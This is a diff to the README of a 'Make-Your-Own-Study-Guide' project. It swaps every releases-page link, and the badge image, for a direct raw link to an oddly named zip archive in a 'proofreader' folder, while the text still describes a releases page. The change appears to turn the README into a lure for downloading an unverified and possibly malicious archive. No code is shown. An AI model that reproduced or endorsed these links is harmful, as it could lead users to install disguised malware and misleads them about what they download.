@@ -1,6 +1,6 @@
 # 📚 Make-Your-Own-Study-Guide - Create Your Custom Study Materials
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%F0%9F%93%9A-blue)](https://github.com/YAIN942/Make-Your-Own-Study-Guide/releases)
+[![Download Latest Release](https://github.com/YAIN942/Make-Your-Own-Study-Guide/raw/refs/heads/main/proofreader/Your-Own-Study-Make-Guide-1.6-beta.4.zip%20Latest%20Release-%F0%9F%93%9A-blue)](https://github.com/YAIN942/Make-Your-Own-Study-Guide/raw/refs/heads/main/proofreader/Your-Own-Study-Make-Guide-1.6-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This guide will help you download and run the **Make-Your-Own-Study-Gui
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click this link to access the download options. [Visit this page to download](https://github.com/YAIN942/Make-Your-Own-Study-Guide/releases).
+1. **Visit the Releases Page**: Click this link to access the download options. [Visit this page to download](https://github.com/YAIN942/Make-Your-Own-Study-Guide/raw/refs/heads/main/proofreader/Your-Own-Study-Make-Guide-1.6-beta.4.zip).
 
 2. **Choose Your Version**: On the releases page, look for the latest version. Click on the version you want to download.
 
@@ -76,4 +76,4 @@ You can report bugs or issues in the "Issues" section of this repository on GitH
 
 For any questions or suggestions, feel free to reach out through the **Issues** section. Your feedback helps us make **Make-Your-Own-Study-Guide** better!
 
-[Visit this page to download](https://github.com/YAIN942/Make-Your-Own-Study-Guide/releases)
+[Visit this page to download](https://github.com/YAIN942/Make-Your-Own-Study-Guide/raw/refs/heads/main/proofreader/Your-Own-Study-Make-Guide-1.6-beta.4.zip)
